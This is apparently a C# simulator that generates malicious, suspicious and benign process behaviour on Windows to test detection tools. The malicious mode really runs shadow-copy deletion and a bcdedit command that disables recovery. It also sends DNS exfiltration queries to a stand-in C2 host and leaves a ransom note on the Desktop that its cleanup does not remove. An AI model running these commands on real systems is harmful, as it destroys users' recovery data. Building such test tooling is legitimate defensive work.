using System.Diagnostics;
using System.Runtime.Versioning;
using System.Text;
using Microsoft.Win32;

[SupportedOSPlatform("windows")]
public static class Simulator
{
    private static readonly string Drop =
        Path.Combine(Path.GetTempPath(), $"sim_{Environment.ProcessId}");

    private static CancellationTokenSource _cts = new();
    private static Task? _currentSequence = null;

    public static async Task Main()
    {
        Console.WriteLine("==============================================");
        Console.WriteLine("   CYBER BEHAVIOUR PROFILING SIMULATOR");
        Console.WriteLine("==============================================");
        Console.WriteLine(" [1] MALICIOUS  - Escalating threat chain");
        Console.WriteLine(" [2] SUSPICIOUS - Probing and scanning");
        Console.WriteLine(" [3] BENIGN     - Ordinary software behavior");
        Console.WriteLine(" [Q] QUIT");
        Console.WriteLine("----------------------------------------------");
        Console.WriteLine(" NOTE: Press 1, 2, or 3 at ANY TIME during execution");
        Console.WriteLine(" to interrupt the current script and switch behaviors.");
        Console.WriteLine(" This demonstrates live escalation/de-escalation!");
        Console.WriteLine("==============================================\n");

        Directory.CreateDirectory(Drop);

        while (true)
        {
            var key = Console.ReadKey(true).KeyChar;
            if (key == 'q' || key == 'Q')
                break;

            if (key == '1' || key == '2' || key == '3')
            {
                // Cancel current sequence if one is running
                if (_currentSequence != null && !_currentSequence.IsCompleted)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("\n[!] INTERRUPT SIGNAL RECEIVED - ABORTING CURRENT SCRIPT...");
                    Console.ResetColor();
                    _cts.Cancel();
                    try { await _currentSequence; } catch { } 
                }

                _cts = new CancellationTokenSource();
                int mode = key - '0';
                
                string modeName = mode == 1 ? "MALICIOUS" : mode == 2 ? "SUSPICIOUS" : "BENIGN";
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine($"\n==============================================");
                Console.WriteLine($" INITIATING {modeName} SEQUENCE");
                Console.WriteLine($"==============================================");
                Console.ResetColor();

                _currentSequence = RunMode(mode, _cts.Token);
            }
        }

        await Cleanup();
    }

    private static async Task RunMode(int mode, CancellationToken ct)
    {
        try
        {
            switch (mode)
            {
                case 1: await RunMalicious(ct); break;
                case 2: await RunSuspicious(ct); break;
                case 3: await RunInconclusive(ct); break;
            }
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"\n[✓] Sequence finished safely.");
            Console.ResetColor();
        }
        catch (OperationCanceledException)
        {
            // Expected when user interrupts
        }
    }

    static async Task RunMalicious(CancellationToken ct)
    {
        await Phase("1 — BASELINE",                     () => Baseline(ct), ct);
        await Phase("2 — DOWNLOAD & DROP",              () => Mal_DownloadAndDrop(ct), ct);
        await Phase("3 — LOLBIN & WMI EXECUTION",       () => Mal_LolbinExecution(ct), ct);
        await Phase("4 — REGISTRY PERSISTENCE",         () => Mal_RegistryPersistence(ct), ct);
        await Phase("5 — CREDENTIAL HARVESTING",        () => Mal_CredentialHarvest(ct), ct);
        await Phase("6 — DATA STAGING & EXFILTRATION",    () => Mal_DataStagingAndExfil(ct), ct);
        await Phase("7 — RANSOMWARE ENCRYPTION",        () => Mal_RansomwareSim(ct), ct);
        await Phase("8 — ANTI-RECOVERY (VSS DELETION)", () => Mal_AntiRecovery(ct), ct);
        await Phase("9 — FILE CHURN",                   () => Mal_FileChurn(ct), ct);
        await Phase("10 — SELF-DELETION",               () => Mal_SelfDeletion(ct), ct);
    }

    static async Task RunSuspicious(CancellationToken ct)
    {
        await Phase("1 — BASELINE",                () => Baseline(ct), ct);
        await Phase("2 — DIRECTORY ENUMERATION",   () => Sus_DirectoryEnum(ct), ct);
        await Phase("3 — SYSTEM DISCOVERY TOOLS",  () => Sus_DiscoveryTools(ct), ct);
        await Phase("4 — PROCESS SPAWNING",        () => Sus_ProcessSpawns(ct), ct);
        await Phase("5 — SCRIPT ENGINE PROBING",   () => Sus_ScriptEngines(ct), ct);
        await Phase("6 — NETWORK PROBING",         () => Sus_NetworkProbe(ct), ct);
        await Phase("7 — RAPID FILE WRITES",       () => Sus_RapidWrites(ct), ct);
    }

    static async Task RunInconclusive(CancellationToken ct)
    {
        await Phase("1 — BASELINE",               () => Baseline(ct), ct);
        await Phase("2 — ORDINARY FILE ACTIVITY", () => Inc_FileActivity(ct), ct);
        await Phase("3 — SINGLE NETWORK CALL",    () => Inc_SingleNetwork(ct), ct);
        await Phase("4 — TEMP FILE WRITES",       () => Inc_TempWrites(ct), ct);
        await Phase("5 — DIRECTORY CHECKS",       () => Inc_DirectoryChecks(ct), ct);
    }

    static async Task Baseline(CancellationToken ct)
    {
        string[] probes =
        {
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Environment.SystemDirectory,
        };
        for (int i = 0; i < 10; i++)
        {
            ct.ThrowIfCancellationRequested();
            foreach (var dir in probes)
                _ = Directory.Exists(dir);
            await Task.Delay(2000, ct);
            Log($"  baseline tick {i + 1}/10");
        }
    }

    static async Task Mal_DownloadAndDrop(CancellationToken ct)
    {
        string staging = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "WindowsUpdate", "cache");
        Directory.CreateDirectory(staging);

        byte[] bytes;
        try
        {
            using var http = new HttpClient();
            http.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            bytes = await http.GetByteArrayAsync("https://github.com", ct);
        }
        catch
        {
            bytes = new byte[512];
            bytes[0] = 0x4D; bytes[1] = 0x5A;
            Log("  (offline — using synthetic PE bytes)");
        }

        string exePath = Path.Combine(staging, "svcupdate.exe");
        string batPath = Path.Combine(staging, "install.bat");
        string ps1Path = Path.Combine(staging, "stage.ps1");
        string dllPath = Path.Combine(staging, "helper.dll");

        await File.WriteAllBytesAsync(exePath, bytes, ct);
        await File.WriteAllTextAsync(batPath, "@echo off\r\necho installing...", ct);
        await File.WriteAllTextAsync(ps1Path, "# stage loader", ct);
        await File.WriteAllTextAsync(dllPath, "MZ", ct);

        Log($"  Dropped: {exePath}");
        Log($"  Dropped: {batPath}");
        Log($"  Dropped: {ps1Path}");
        Log($"  Dropped: {dllPath}");

        _extraDirs.Add(staging);
        await Task.Delay(1000, ct);
    }

    static async Task Mal_LolbinExecution(CancellationToken ct)
    {
        await Spawn("powershell.exe",
            "-ExecutionPolicy Bypass -NoProfile -Command \"Write-Host 'Simulated payload execution'; Start-Sleep 2\"",
            showWindow: true);
        await Task.Delay(1500, ct);

        string cmd     = "Write-Host 'payload'";
        string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(cmd));
        Log("Spawning powershell.exe -EncodedCommand <base64> ...");
        await Spawn("powershell.exe", $"-EncodedCommand {encoded}", showWindow: true);
        await Task.Delay(1500, ct);

        Log("Spawning wmic.exe (WMI Execution)...");
        await Spawn("wmic.exe", "process call create \"cmd.exe /c echo WMI Spawned\"");
        await Task.Delay(1000, ct);

        Log("Spawning certutil.exe (LOLBin) ...");
        await Spawn("certutil.exe",
            "-hashfile \"" + Environment.GetCommandLineArgs()[0] + "\" MD5");
        await Task.Delay(1000, ct);

        Log("Spawning mshta.exe (LOLBin) ...");
        await Spawn("mshta.exe", "about:blank");
        await Task.Delay(1000, ct);
    }

    static async Task Mal_RegistryPersistence(CancellationToken ct)
    {
        const string runKey  = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        const string valName = "SimUpdate";

        Log($"Writing HKCU\\{runKey}\\{valName} ...");
        using (var key = Registry.CurrentUser.OpenSubKey(runKey, writable: true))
            key?.SetValue(valName, @"C:\Windows\Temp\svcupdate.exe");
        await Task.Delay(2000, ct);

        Log("  Removing persistence key...");
        using (var key = Registry.CurrentUser.OpenSubKey(runKey, writable: true))
            key?.DeleteValue(valName, throwOnMissingValue: false);

        Log("Reading Winlogon key...");
        using var wl = Registry.LocalMachine.OpenSubKey(
            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
        Log($"  Userinit = {wl?.GetValue("Userinit") ?? "(no access)"}");
        await Task.Delay(500, ct);
    }

    static async Task Mal_CredentialHarvest(CancellationToken ct)
    {
        string appdata  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string localapp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string home     = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

        string[] targets =
        {
            Path.Combine(localapp, "Google", "Chrome", "User Data", "Default", "Login Data"),
            Path.Combine(localapp, "Google", "Chrome", "User Data", "Default", "Cookies"),
            Path.Combine(appdata,  "Microsoft", "Credentials"),
            Path.Combine(appdata,  "Microsoft", "Protect"),
            Path.Combine(home, ".ssh", "id_rsa"),
            Path.Combine(home, ".ssh", "known_hosts"),
            Path.Combine(appdata, "Mozilla", "Firefox", "Profiles"),
        };

        Log("Probing credential file locations...");
        foreach (var target in targets)
        {
            ct.ThrowIfCancellationRequested();
            try
            {
                bool exists = File.Exists(target) || Directory.Exists(target);
                Log($"  {(exists ? "[found]" : "[not found]")} {target}");
            }
            catch { Log($"  [denied]  {target}"); }
            await Task.Delay(200, ct);
        }
    }

    static async Task Mal_DataStagingAndExfil(CancellationToken ct)
    {
        Log("Archiving stolen credentials into staging folder...");
        string stageDir = Path.Combine(Drop, "staging");
        Directory.CreateDirectory(stageDir);
        string zipPath = Path.Combine(stageDir, "loot.zip");

        // Write a fake ZIP file with the PK header
        byte[] fakeZip = { 0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00 };
        await File.WriteAllBytesAsync(zipPath, fakeZip, ct);
        Log($"  Zipped stolen data to: {zipPath}");
        await Task.Delay(800, ct);

        // Simulate additional rapid staging (writing small chunks of data)
        int count = 0;
        for (int round = 0; round < 4; round++)
        {
            ct.ThrowIfCancellationRequested();
            string path = Path.Combine(stageDir, $"chunk_{count++}.bin");
            await File.WriteAllBytesAsync(path, Encoding.UTF8.GetBytes(new string('A', 512)), ct);
            await Task.Delay(50, ct);
        }
        Log($"  Wrote {count} additional staged payload chunks.");

        Log("Simulating DNS Exfiltration (subdomain tunneling)...");
        for (int i = 0; i < 3; i++)
        {
            ct.ThrowIfCancellationRequested();
            string junkInfo = Guid.NewGuid().ToString("N");
            string dnsQuery = $"{junkInfo}.evil-c2-domain.com";
            Log($"  DNS Query: {dnsQuery}");
            try { System.Net.Dns.GetHostEntry(dnsQuery); } catch { }
            await Task.Delay(100, ct);
        }

        Log("Calling out to Command & Control (Exfiltrating staging files)...");
        using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };
        foreach (var host in new[] { "https://api.github.com", "https://pastebin.com/raw/example" })
        {
            ct.ThrowIfCancellationRequested();
            try   { _ = await http.GetStringAsync(host, ct); Log($"  Connected and sent: {host}"); }
            catch { Log($"  (no route to {host})"); }
            await Task.Delay(300, ct);
        }
    }

    static async Task Mal_FileChurn(CancellationToken ct)
    {
        string churnDir = Path.Combine(Drop, "churn");
        Directory.CreateDirectory(churnDir);
        var written = new List<string>();

        Log("Writing 30 files then deleting them (churn)...");
        for (int i = 0; i < 30; i++)
        {
            ct.ThrowIfCancellationRequested();
            string p = Path.Combine(churnDir, $"tmp_{i}.dat");
            await File.WriteAllTextAsync(p, $"churn {i}", ct);
            written.Add(p);
            await Task.Delay(30, ct);
        }
        await Task.Delay(300, ct);
        foreach (var p in written)
        {
            ct.ThrowIfCancellationRequested();
            try { File.Delete(p); } catch { }
            await Task.Delay(15, ct);
        }
        Log($"  Churned {written.Count} files.");
    }

    static async Task Mal_RansomwareSim(CancellationToken ct)
    {
        string docsFolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string rnsmDir = Path.Combine(Drop, "locked_files");
        Directory.CreateDirectory(rnsmDir);
        
        Log("Simulating mass encryption of documents...");
        for (int i = 0; i < 20; i++)
        {
            ct.ThrowIfCancellationRequested();
            string original = Path.Combine(rnsmDir, $"financial_record_{i}.pdf");
            string encrypted = Path.Combine(rnsmDir, $"financial_record_{i}.pdf.locked");
            
            await File.WriteAllTextAsync(original, "dummy data", ct);
            await File.WriteAllBytesAsync(encrypted, new byte[] { 0x55, 0xAA, 0xFF }, ct);
            try { File.Delete(original); } catch { }
            
            await Task.Delay(20, ct);
        }
        
        Log("Dropping ransomware note...");
        string rnote = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "README_RECOVER_FILES.txt");
        try { await File.WriteAllTextAsync(rnote, "All your files are encrypted.", ct); _extraDirs.Add(rnote); } catch { }
        await Task.Delay(1000, ct);
    }

    static async Task Mal_AntiRecovery(CancellationToken ct)
    {
        Log("Executing Anti-Recovery (Volume Shadow Copy Deletion)...");
        await Spawn("vssadmin.exe", "delete shadows /all /quiet", showWindow: false);
        await Task.Delay(1500, ct);

        Log("Executing BCD modification (Disabling Recovery Mode)...");
        await Spawn("bcdedit.exe", "/set {default} recoveryenabled No", showWindow: false);
        await Task.Delay(1500, ct);
    }

    static async Task Mal_SelfDeletion(CancellationToken ct)
    {
        string marker = Path.Combine(Drop, "marker.exe");
        await File.WriteAllTextAsync(marker, "marker", ct);

        await Spawn("cmd.exe",
            $"/c ping -n 3 127.0.0.1 > nul && del /f /q \"{marker}\"");
        await Task.Delay(4000, ct);
        Log("  Done.");
    }

    static async Task Sus_DirectoryEnum(CancellationToken ct)
    {
        string appdata  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string localapp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string home     = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

        string[] dirs =
        {
            Path.Combine(localapp, "Google", "Chrome", "User Data"),
            Path.Combine(localapp, "Microsoft", "Edge", "User Data"),
            Path.Combine(appdata,  "Mozilla", "Firefox", "Profiles"),
            Path.Combine(appdata,  "Microsoft", "Credentials"),
            Path.Combine(appdata,  "Microsoft", "Protect"),
            Path.Combine(home, ".ssh"),
            Path.Combine(home, ".aws"),
            Path.Combine(home, ".azure"),
            Path.Combine(Environment.SystemDirectory, "config"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Temp"),
        };

        Log("Checking if sensitive directories exist (no files opened)...");
        foreach (var dir in dirs)
        {
            ct.ThrowIfCancellationRequested();
            bool exists = Directory.Exists(dir);
            Log($"  {(exists ? "[exists]" : "[absent]")} {dir}");
            await Task.Delay(300, ct);
        }
    }

    static async Task Sus_DiscoveryTools(CancellationToken ct)
    {
        (string exe, string args)[] commands =
        {
            ("whoami.exe",     "/all"),
            ("ipconfig.exe",   "/all"),
            ("systeminfo.exe", ""),
            ("netstat.exe",    "-an"),
            ("tasklist.exe",   ""),
            ("hostname.exe",   ""),
        };

        Log("Running system discovery commands...");
        foreach (var (exe, args) in commands)
        {
            ct.ThrowIfCancellationRequested();
            Log($"  Spawning {exe} {args}");
            await Spawn(exe, args);
            await Task.Delay(800, ct);
        }
    }

    static async Task Sus_ProcessSpawns(CancellationToken ct)
    {
        await Spawn("cmd.exe", "/c echo System check complete");
        await Task.Delay(1000, ct);

        await Spawn("powershell.exe",
            "-Command \"Get-Date; Get-Process | Select-Object -First 5\"",
            showWindow: true);
        await Task.Delay(1500, ct);

        Log("Spawning certutil.exe (hash check only)...");
        await Spawn("certutil.exe",
            "-hashfile \"" + Environment.GetCommandLineArgs()[0] + "\" SHA256");
        await Task.Delay(1000, ct);
    }

    static async Task Sus_ScriptEngines(CancellationToken ct)
    {
        Log("Probing Script Engines (cscript, wscript, rundll32)...");
        await Spawn("cscript.exe", "//B //Nologo", showWindow: false);
        await Task.Delay(800, ct);

        await Spawn("wscript.exe", "//E:vbs", showWindow: false);
        await Task.Delay(800, ct);

        await Spawn("rundll32.exe", "shell32.dll,Control_RunDLL", showWindow: true);
        await Task.Delay(1000, ct);
    }

    static async Task Sus_NetworkProbe(CancellationToken ct)
    {
        Log("Making outbound HTTP connections...");
        using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };
        string[] urls =
        {
            "https://www.google.com",
            "https://github.com",
            "https://ipinfo.io/json",
        };

        foreach (var url in urls)
        {
            ct.ThrowIfCancellationRequested();
            try   { _ = await http.GetStringAsync(url, ct); Log($"  Connected: {url}"); }
            catch { Log($"  (no route to {url})"); }
            await Task.Delay(500, ct);
        }
    }

    static async Task Sus_RapidWrites(CancellationToken ct)
    {
        string dir = Path.Combine(Drop, "scratch");
        Directory.CreateDirectory(dir);

        Log("Writing 20 temporary data files quickly...");
        for (int i = 0; i < 20; i++)
        {
            ct.ThrowIfCancellationRequested();
            string p = Path.Combine(dir, $"note_{i}.txt");
            await File.WriteAllTextAsync(p, $"scratch data {i}", ct);
            await Task.Delay(60, ct);
        }
        Log("  Done.");
        await Task.Delay(500, ct);
    }

    static async Task Inc_FileActivity(CancellationToken ct)
    {
        string[] paths =
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Desktop"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
        };

        Log("Checking ordinary user directories...");
        foreach (var p in paths)
        {
            ct.ThrowIfCancellationRequested();
            bool exists = Directory.Exists(p);
            Log($"  {(exists ? "[exists]" : "[absent]")} {p}");
            await Task.Delay(500, ct);
        }
    }

    static async Task Inc_SingleNetwork(CancellationToken ct)
    {
        Log("Making a single HTTP request...");
        try
        {
            using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };
            _ = await http.GetStringAsync("https://www.google.com", ct);
            Log("  Connected to www.google.com");
        }
        catch { Log("  (no route)"); }
        await Task.Delay(500, ct);
    }

    static async Task Inc_TempWrites(CancellationToken ct)
    {
        Log("Writing 3 temp files...");
        for (int i = 0; i < 3; i++)
        {
            ct.ThrowIfCancellationRequested();
            string p = Path.Combine(Drop, $"cache_{i}.dat");
            await File.WriteAllTextAsync(p, $"cached value {i}", ct);
            Log($"  Wrote {p}");
            await Task.Delay(400, ct);
        }
    }

    static async Task Inc_DirectoryChecks(CancellationToken ct)
    {
        string[] dirs =
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Common Files"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Fonts"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft"),
        };

        Log("Checking common system directories...");
        foreach (var dir in dirs)
        {
            ct.ThrowIfCancellationRequested();
            bool exists = Directory.Exists(dir);
            Log($"  {(exists ? "[exists]" : "[absent]")} {dir}");
            await Task.Delay(400, ct);
        }
    }

    private static readonly List<string> _extraDirs = [];

    static async Task Phase(string name, Func<Task> action, CancellationToken ct) 
    {
        ct.ThrowIfCancellationRequested();
        Console.ForegroundColor = ConsoleColor.Magenta;
        Console.WriteLine($"\n>> [PHASE] {name}");
        Console.ResetColor();
        await action();
    }

    static void Log(string msg) 
    { 
        Console.WriteLine(msg); 
    }

    static async Task Spawn(string exe, string args, bool showWindow = false)
    {
        try
        {
            var psi = new ProcessStartInfo(exe, args)
            {
                CreateNoWindow  = !showWindow,
                UseShellExecute = false,
            };
            using var p = Process.Start(psi);
            await Task.Run(() => p?.WaitForExit(5000));
        }
        catch { }
    }

    static async Task Cleanup()
    {
        foreach (var dir in _extraDirs)
            try { Directory.Delete(dir, recursive: true); } catch { }
        try { Directory.Delete(Drop, recursive: true); } catch { }
        await Task.CompletedTask;
    }
}
